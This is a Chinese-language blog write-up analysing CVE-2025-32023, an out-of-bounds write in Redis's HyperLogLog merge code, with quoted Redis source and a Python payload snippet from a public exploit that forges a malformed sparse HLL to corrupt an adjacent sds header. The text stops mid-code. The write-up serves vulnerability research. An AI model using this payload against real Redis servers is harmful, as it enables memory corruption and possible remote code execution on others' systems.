<!DOCTYPE html>
<html lang="EN">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>CVE-2025-32023 Redis  漏洞分析 | Swing&#39;Blog 浮生若梦</title>


<meta name="description" content="Know it then hack it!">


<meta name="author" content="Swing">



<!-- Canonical -->
<link rel="canonical" href="/CVE-2025-32023%20Redis-RCE-Via-Out-of-bounds-write.html">

<!-- Favicon -->
<link rel="icon" href="/images/favicon.ico">

<!-- RSS -->

<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">


<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2025-32023 Redis  漏洞分析">
<meta property="og:url" content="/CVE-2025-32023%20Redis-RCE-Via-Out-of-bounds-write.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">

<meta property="og:description" content="Know it then hack it!">


<!-- Twitter Card -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2025-32023 Redis  漏洞分析">

<meta name="twitter:description" content="Know it then hack it!">


<!-- Theme Color -->
<meta name="theme-color" content="#1d1f21">
<meta name="msapplication-TileColor" content="#1d1f21">

<!-- Stylesheets -->

<link rel="stylesheet" href="/css/style.css">


<!-- Analytics -->


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="theme-dark">
  <div class="container">
    <header class="header">
  <div class="header-inner">
    <div class="header-brand">
      
      <a href="/" class="site-title">
        Swing&#39;Blog 浮生若梦
      </a>
    </div>

    <nav class="nav">
      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
        <span class="nav-toggle-bar"></span>
      </button>

      <ul class="nav-menu" id="nav-menu">
        
          
          
            
            <li class="nav-item">
              <a href="/"
                 class="nav-link"
                 >
                Home
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/about/"
                 class="nav-link"
                 >
                About
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/archives/"
                 class="nav-link"
                 >
                Articles
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/atom.xml"
                 class="nav-link"
                 >
                RSS
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/categories/"
                 class="nav-link"
                 >
                Categories
              </a>
            </li>
            
              <li class="nav-divider">|</li>
            
          
            
            <li class="nav-item">
              <a href="/link"
                 class="nav-link"
                 >
                Links
              </a>
            </li>
            
          
        
      </ul>
    </nav>
  </div>
</header>


    <main class="main">
      
        <div class="page-layout">
          <article class="post">
  <header class="post-header">
  <h1 class="post-title">CVE-2025-32023 Redis  漏洞分析</h1>

  <div class="post-meta">
    <span class="meta-item">
      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
      <time datetime="2025-07-08">
        2025-07-08
      </time>
    </span>

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
        <time datetime="2025-07-12">
          Updated on 2025-07-12
        </time>
      </span>
    

    
      <span class="meta-item">
        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
        
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
        
      </span>
    
  </div>
</header>


  
    <nav class="toc">
  <h3 class="toc-title">Table of Contents</h3>
  <div class="toc-list">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-32023"><span class="toc-text">CVE-2025-32023</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC-%E6%9E%84%E9%80%A0"><span class="toc-text">PoC 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%B6%8A%E7%95%8C-payload"><span class="toc-text">构造越界 payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B6%8A%E7%95%8C%E5%86%99%E7%9B%AE%E6%A0%87"><span class="toc-text">寻找越界写目标</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">完整的利用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-text">Reference link</span></a>
  </div>
</nav>

  

  <div class="post-content">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>漏洞分析版本： <code>commit a0a6f23d997b024689ba157916837f493a593a34 (HEAD, tag: 7.4.2)</code></p>
<p>该漏洞是 PlaidCTF 2025 “Zerodeo” 题目。</p>
<h3 id="CVE-2025-32023"><a href="#CVE-2025-32023" class="headerlink" title="CVE-2025-32023"></a>CVE-2025-32023</h3><p>Redis 在调用 <code>pfmerge</code> 命令的时候会调用 <code>hyperloglog.c</code> 里的 <code>void pfmergeCommand(client *c)</code> 函数</p>
<p><code>pfmerge</code> <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://redis.io/docs/latest/commands/pfmerge/">[1]</span></a></sup> 的作用是将多个 HLL 的数据合并到一个目标 key 中， 是用来合并多个 HypeLogLog （HLL）数据。 对格式错误的 HLL 进行操作时，可能会使 int i 中计数的总长度溢出为负值。这允许攻击者覆盖 HLL 结构上的负偏移量，从而导致栈/堆上的越界写。 (eg: <code>hllMerge()</code> 函数中会发生栈越界， <code>hllSparseToDense()</code> 发生堆越界写）</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PFMERGE dest src1 src2 src3 ... srcN =&gt; OK */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pfmergeCommand</span><span class="params">(client *c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> max[HLL_REGISTERS];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> *<span class="title">hdr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> use_dense = <span class="number">0</span>; <span class="comment">/* Use dense representation as target? */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute an HLL with M[i] = MAX(M[i]_j).</span></span><br><span class="line"><span class="comment">     * We store the maximum into the max array of registers. We&#x27;ll write</span></span><br><span class="line"><span class="comment">     * it to the target variable later. */</span></span><br><span class="line">    <span class="built_in">memset</span>(max,<span class="number">0</span>,<span class="keyword">sizeof</span>(max));</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++) &#123;</span><br><span class="line">			...</span><br><span class="line">        <span class="comment">/* Merge with this HLL with our &#x27;max&#x27; HLL by setting max[i]</span></span><br><span class="line"><span class="comment">         * to MAX(max[i],hll[i]). */</span></span><br><span class="line">        <span class="keyword">if</span> (hllMerge(max,o) == C_ERR) &#123; <span class="comment">// hllMerge [1] stack oob write</span></span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">    <span class="comment">/* Convert the destination object to dense representation if at least</span></span><br><span class="line"><span class="comment">     * one of the inputs was dense. */</span></span><br><span class="line">    <span class="keyword">if</span> (use_dense &amp;&amp; hllSparseToDense(o) == C_ERR) &#123; <span class="comment">// hllSparseToDense [2] heap oob write</span></span><br><span class="line">			...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>hllSparseToDense</code> 函数中会造成堆相关的越界写， 作者的漏洞利用也是用的这个漏洞原语。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hllSparseToDense</span><span class="params">(robj *o)</span> </span>&#123;</span><br><span class="line">    sds sparse = o-&gt;ptr, dense;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> *<span class="title">hdr</span>, *<span class="title">oldhdr</span> =</span> (struct hllhdr*)sparse;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>, runlen, regval;</span><br><span class="line">    <span class="keyword">uint8_t</span> *p = (<span class="keyword">uint8_t</span>*)sparse, *end = p+sdslen(sparse);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the representation is already the right one return ASAP. */</span></span><br><span class="line">    hdr = (struct hllhdr*) sparse;</span><br><span class="line">    <span class="keyword">if</span> (hdr-&gt;encoding == HLL_DENSE) <span class="keyword">return</span> C_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a string of the right size filled with zero bytes.</span></span><br><span class="line"><span class="comment">     * Note that the cached cardinality is set to 0 as a side effect</span></span><br><span class="line"><span class="comment">     * that is exactly the cardinality of an empty HLL. */</span></span><br><span class="line">    dense = sdsnewlen(<span class="literal">NULL</span>,HLL_DENSE_SIZE);</span><br><span class="line">    hdr = (struct hllhdr*) dense;</span><br><span class="line">    *hdr = *oldhdr; <span class="comment">/* This will copy the magic and cached cardinality. */</span></span><br><span class="line">    hdr-&gt;encoding = HLL_DENSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now read the sparse representation and set non-zero registers</span></span><br><span class="line"><span class="comment">     * accordingly. */</span></span><br><span class="line">    p += HLL_HDR_SIZE;</span><br><span class="line">    <span class="keyword">while</span>(p &lt; end) &#123;</span><br><span class="line">        <span class="keyword">if</span> (HLL_SPARSE_IS_ZERO(p)) &#123;</span><br><span class="line">            runlen = HLL_SPARSE_ZERO_LEN(p);</span><br><span class="line">            idx += runlen;</span><br><span class="line">            p++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (HLL_SPARSE_IS_XZERO(p)) &#123;</span><br><span class="line">            runlen = HLL_SPARSE_XZERO_LEN(p);</span><br><span class="line">            idx += runlen;</span><br><span class="line">            p += <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            runlen = HLL_SPARSE_VAL_LEN(p);</span><br><span class="line">            regval = HLL_SPARSE_VAL_VALUE(p);</span><br><span class="line">            <span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br><span class="line">            <span class="keyword">while</span>(runlen--) &#123;</span><br><span class="line">                HLL_DENSE_SET_REGISTER(hdr-&gt;registers,idx,regval);</span><br><span class="line">                idx++;</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the sparse representation was valid, we expect to find idx</span></span><br><span class="line"><span class="comment">     * set to HLL_REGISTERS. */</span></span><br><span class="line">    <span class="keyword">if</span> (idx != HLL_REGISTERS) &#123;</span><br><span class="line">        sdsfree(dense);</span><br><span class="line">        <span class="keyword">return</span> C_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Free the old representation and set the new one. */</span></span><br><span class="line">    sdsfree(o-&gt;ptr);</span><br><span class="line">    o-&gt;ptr = dense;</span><br><span class="line">    <span class="keyword">return</span> C_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>while 循环之前是对 HLL 数据的的部分 header 解析，之后是一个转换过程。 HLL 数据是一种 SDS <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://redis.io/docs/latest/operate/oss_and_stack/reference/internals/internals-sds/">[2]</span></a></sup>字符串的表示。 我们可以用 <code>set</code> 命令来伪造一个 HLL 数据。</p>
<p>while 循环过程中，是将 HLL 的数据从 <code>sparse</code> 转换成 <code>dense</code>。 在转换过程中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(p &lt; end) &#123;</span><br><span class="line">    <span class="keyword">if</span> (HLL_SPARSE_IS_ZERO(p)) &#123;</span><br><span class="line">        runlen = HLL_SPARSE_ZERO_LEN(p);</span><br><span class="line">        idx += runlen;</span><br><span class="line">        p++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (HLL_SPARSE_IS_XZERO(p)) &#123;</span><br><span class="line">        runlen = HLL_SPARSE_XZERO_LEN(p);</span><br><span class="line">        idx += runlen;</span><br><span class="line">        p += <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        runlen = HLL_SPARSE_VAL_LEN(p);</span><br><span class="line">        regval = HLL_SPARSE_VAL_VALUE(p);</span><br><span class="line">        <span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br><span class="line">        <span class="keyword">while</span>(runlen--) &#123;</span><br><span class="line">            HLL_DENSE_SET_REGISTER(hdr-&gt;registers,idx,regval);</span><br><span class="line">            idx++;</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前的数据既不是 <code>HLL_SPARSE_IS_ZERO</code> 也不是 <code>HLL_SPARSE_IS_XZERO</code> 会进入到  <code>HLL_DENSE_SET_REGISTER</code> 函数， 在进到 <code>HLL_DENSE_SET_REGISTER</code> 函数之前有一个判断这个 idx 是否越界。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((runlen + idx) &gt; HLL_REGISTERS) <span class="keyword">break</span>; <span class="comment">/* Overflow. */</span></span><br></pre></td></tr></table></figure>

<p><code>runlen</code> 和 <code>idx</code> 都是一个 int 类型的变量， ， 而 idx 的值可以在 <code>HLL_SPARSE_IS_ZERO</code> 或者 <code>HLL_SPARSE_IS_ZERO</code> 条件下语句中累加而成。</p>
<p>我们可以通过构造 HLL 数据， 让 idx 不断累加成一个负数。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-dd6ba4cc0ca1be110782321dd59e6908-4b5138.png" alt="image.png"></a></p>
<p>然后在 <code>HLL_DENSE_SET_REGISTER</code> 函数中就会发生越界</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_DENSE_SET_REGISTER(p,regnum,val) do &#123; \</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *_p = (<span class="keyword">uint8_t</span>*) p; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _byte = (regnum)*HLL_BITS/<span class="number">8</span>; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _fb = (regnum)*HLL_BITS&amp;<span class="number">7</span>; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _fb8 = <span class="number">8</span> - _fb; \</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> _v = (val); \</span><br><span class="line">    _p[_byte] &amp;= ~(HLL_REGISTER_MAX &lt;&lt; _fb); \</span><br><span class="line">    _p[_byte] |= _v &lt;&lt; _fb; \</span><br><span class="line">    _p[_byte+<span class="number">1</span>] &amp;= ~(HLL_REGISTER_MAX &gt;&gt; _fb8); \</span><br><span class="line">    _p[_byte+<span class="number">1</span>] |= _v &gt;&gt; _fb8; \</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="PoC-构造"><a href="#PoC-构造" class="headerlink" title="PoC 构造"></a>PoC 构造</h4><h5 id="构造越界-payload"><a href="#构造越界-payload" class="headerlink" title="构造越界 payload"></a>构造越界 payload</h5><p>HLL 结构大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. HLL 总体结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hllhdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> magic[<span class="number">4</span>];      <span class="comment">/* &quot;HYLL&quot; */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> encoding;   <span class="comment">/* HLL_DENSE or HLL_SPARSE. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> notused[<span class="number">3</span>]; <span class="comment">/* Reserved for future use, must be zero. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> card[<span class="number">8</span>];    <span class="comment">/* Cached cardinality, little endian. */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> registers[]; <span class="comment">/* Data bytes. */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_P 14 <span class="comment">/* The greater is P, the smaller the error. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_REGISTERS (1&lt;&lt;HLL_P) <span class="comment">/* With P=14, 16384 registers. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HLL_DENSE_SIZE (HLL_HDR_SIZE+((HLL_REGISTERS*HLL_BITS+7)/8))</span></span><br><span class="line"></span><br><span class="line">  +---------+----------+-----------+--------+-----------</span><br><span class="line">  | <span class="string">&quot;HYLL&quot;</span>  | encoding |  noused   | card   | registers</span><br><span class="line">  +---------+----------+--------------------+-----------</span><br><span class="line">   <span class="number">4</span>字节      <span class="number">1</span>字节        <span class="number">3</span>字节       <span class="number">8</span>字节    <span class="number">12288</span>字节</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>稀疏（Sparse）编码<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+---------+----------+---------+---------+-------------------+</span><br><span class="line">| <span class="string">&quot;HYLL&quot;</span>  |  <span class="number">0x01</span>    | 保留<span class="number">3</span>字节 | 保留<span class="number">8</span>字节 | 指令流（<span class="number">2</span>字节/条） |</span><br><span class="line">+---------+----------+---------+---------+-------------------+</span><br></pre></td></tr></table></figure>


</li>
</ol>
<p>从作者的exploit<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://github.com/leesh3288/CVE-2025-32023">[3]</span></a></sup>可以看到， 作者通过构造如下的  HLL sparse  让在代码在转换的时候能计算出来一个负数的idx</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pl = <span class="string">b&#x27;HYLL&#x27;</span>·</span><br><span class="line">pl += p8(HLL_SPARSE) + p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl += p8(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pl) == <span class="number">0x10</span></span><br><span class="line">pl += xzero(<span class="number">0x4000</span>) * <span class="number">0x3fffd</span>   <span class="comment"># -0xc000</span></span><br><span class="line">pl += xzero(<span class="number">0xc000</span> - <span class="number">0x956c</span>)    <span class="comment"># -0x956c, where divmod(-0x956c*6, 8) = (-0x7011, 0)</span></span><br><span class="line">pl += p8(<span class="number">0b1_00011_00</span>)          <span class="comment"># runlen = 1, regval = 4 = SDS_TYPE_64 =&gt; -0x956b, overwrite sds:b type</span></span><br><span class="line">pl += xzero(<span class="number">0x156b</span>)             <span class="comment"># -0x8000</span></span><br><span class="line">pl += xzero(<span class="number">0x4000</span>) * <span class="number">3</span>         <span class="comment"># 0x4000</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;hll:expp&#x27;</span>, pl)</span><br></pre></td></tr></table></figure>

<p>可以看到有一段 <code>xzero(0x4000) * 0x3fffd</code> 的数据， 可以通过这样数据，就构造 0x3fffd 轮次的  0x4000 idx 累加， 在加上后面的 <code>pl += xzero(0xc000 - 0x956c)</code>  数据，最后就能构造一个负数的 <code>idx</code></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-bd320665ad21fcff8300fdc9e2e0270c-3ac98d.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-bd320665ad21fcff8300fdc9e2e0270c-3ac98d.png" alt="image.png"></a></p>
<h5 id="寻找越界写目标"><a href="#寻找越界写目标" class="headerlink" title="寻找越界写目标"></a>寻找越界写目标</h5><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-619c1f3013ee7e5cc66707310d32facb-5d6e72.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-619c1f3013ee7e5cc66707310d32facb-5d6e72.png" alt="image.png"></a></p>
<p>在单次下， 我们可以从 registers 往前越界写任意（可构造）偏移一个字节。 作者的思路是在 HLL 结构前面构造 sds 结构， 然后修改 sds 结构的 len 来进行类型混淆。</p>
<p>sds 有几种不同的类型， 其取长度的方式也不一样·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">size_t</span> <span class="title">sdslen</span><span class="params">(<span class="keyword">const</span> sds s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags = s[<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">switch</span>(flags&amp;SDS_TYPE_MASK) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5:</span><br><span class="line">            <span class="keyword">return</span> SDS_TYPE_5_LEN(flags);</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">8</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">16</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">32</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">64</span>,s)-&gt;len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如正常情况下， 我们使用 setrange 长度为<code>0x37fa-8</code>长度， 此时长度小于 65535 ,  根据函数<code>sdsReqType</code> 创建出来的 sds 数据，其 <code>flags</code> 位置应该是 2 （SDS_TYPE_16）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//func sdsnewlen()-&gt; _sdsnewlen() -&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">sdsReqType</span><span class="params">(<span class="keyword">size_t</span> string_size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_5;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1</span>&lt;&lt;<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_16;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (LONG_MAX == 